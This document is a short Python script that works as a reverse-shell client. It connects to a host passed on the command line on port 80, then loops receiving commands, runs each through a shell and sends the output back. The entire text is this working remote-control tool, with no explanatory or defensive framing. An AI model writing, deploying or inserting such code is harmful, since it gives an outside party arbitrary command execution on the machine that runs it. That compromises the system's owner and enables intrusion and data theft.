import socket
import subprocess
import sys

HOST = sys.argv[1]
PORT = 80
BUFFER = 1024

s = socket.socket()
s.connect((HOST, PORT))

while True:
	cmd = s.recv(BUFFER).decode()
	
	rsp = subprocess.getoutput(cmd)
	
	s.send(rsp.encode())
